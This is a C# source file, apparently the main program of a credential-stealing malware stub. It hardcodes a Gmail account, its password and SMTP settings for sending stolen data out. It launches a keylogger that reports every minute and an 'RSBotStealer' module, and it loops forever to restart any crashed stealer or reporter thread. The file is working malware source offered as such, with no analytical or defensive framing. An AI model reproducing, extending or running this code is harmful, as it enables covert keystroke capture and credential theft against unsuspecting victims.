using System.Threading;
using sub.Stealers;
using sub.Util.Threading;

namespace sub
{
    internal class Program
    {
        public static Settings Settings;
        private static void Main()
        {
            /* SettingsParser parser = new SettingsParser(Application.ExecutablePath);
             * string decryptedSettings = parser.GetSettings();
             * settings = Settings.DeserializeFromSelf(decryptedSettings);
             */

            Settings = new Settings
                                    {
                                        EmailAddress = "sexmongrel69@gmail.com",
                                        EmailPassword = "omglawls",
                                        SmtpAddress = "smtp.gmail.com",
                                        SmtpPort = 587
                                    };

            Variables.Mutex = new Mutex(false, Variables.MutexID, out Variables.CreatedMutex);
            
            StealerThread logger = new StealerThread(new Keylogger(), 1);    
            logger.Start(); //Starts a Keylogger that reports every 1 minute
            

            StealerThread rsbot = new StealerThread(new RSBotStealer(), -1);
            rsbot.Start();

            while (true)
            {
                //Implement some kind of checking to make sure none of the threads crashed
                //Restart them if they did (unless they are meant to run once)
                foreach(StealerThread st in Variables.stealerPool)
                {
                    if (st.GetDelay() < 1) continue; //If it is meant to run once, don't revive
                    if(st.GetStealerThread().ThreadState != ThreadState.Running
                        && st.GetStealerThread().ThreadState != ThreadState.WaitSleepJoin)
                    {
                        st.Start();
                    }
                    if(st.GetReporterThread().ThreadState != ThreadState.Running
                        && st.GetReporterThread().ThreadState != ThreadState.WaitSleepJoin)
                    {
                        st.Start();
                    }
                }
                Thread.Sleep(5000); //Sleep the main thread so the stub doesn't close
            }
        }
    }
}